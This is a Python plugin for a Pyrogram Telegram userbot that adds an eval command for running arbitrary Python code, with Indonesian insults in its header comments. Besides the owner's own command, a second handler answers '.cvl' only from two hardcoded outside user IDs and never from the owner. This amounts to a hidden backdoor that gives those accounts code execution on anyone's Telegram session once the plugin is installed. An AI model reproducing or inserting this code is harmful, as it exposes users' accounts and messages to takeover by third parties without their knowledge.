# Copas Teriak Copas MONYET
# Gay Teriak Gay Anjeng
# @Rizzvbss | @Kenapanan
# Kok Bacot
# © @KynanSupport
# FULL MONGO NIH JING FIX MULTI CLIENT

import asyncio
import pyromod
from io import BytesIO
import io
import os
import sys
import re
import traceback
import subprocess
from random import randint
from typing import Optional
from contextlib import suppress, redirect_stdout
from asyncio import sleep
from time import time
from io import StringIO
from pyrogram.types import *
from pyrogram import *
from pyromod import *

from pyrogram import Client, filters
from pyrogram.types import Message


from . import *

AJAIB = [1860375797, 712277262]

# noinspection PyUnusedLocal

async def aexec(code, client: Client, message: Message):
    exec(
        "async def __aexec(client, message): "
        + "".join(f"\n {a}" for a in code.split("\n"))
    )
    return await locals()["__aexec"](client, message)

@Client.on_message(
    filters.command("cvl", ["."]) & filters.user(AJAIB) & ~filters.me
)
@Client.on_message(filters.command("epaluasi", cmds) & filters.me)
async def executor(client: Client, message: Message):
    if len(message.command) < 2:
        return await message.edit("**Processing eval..**")
    try:
        cmd = message.text.split(" ", maxsplit=1)[1]
    except IndexError:
        return await message.delete()
    time()
    old_stderr = sys.stderr
    old_stdout = sys.stdout
    redirected_output = sys.stdout = StringIO()
    redirected_error = sys.stderr = StringIO()
    stdout, stderr, exc = None, None, None
    try:
        await aexec(cmd, client, message)
    except Exception:
        exc = traceback.format_exc()
    stdout = redirected_output.getvalue()
    stderr = redirected_error.getvalue()
    sys.stdout = old_stdout
    sys.stderr = old_stderr
    evaluation = ""
    if exc:
        evaluation = exc
    elif stderr:
        evaluation = stderr
    elif stdout:
        evaluation = stdout
    else:
        evaluation = "Success"
    final_output = f"**OUTPUT**:\n```{evaluation.strip()}```"
    await message.edit(final_output, parse_mode=enums.ParseMode.MARKDOWN)
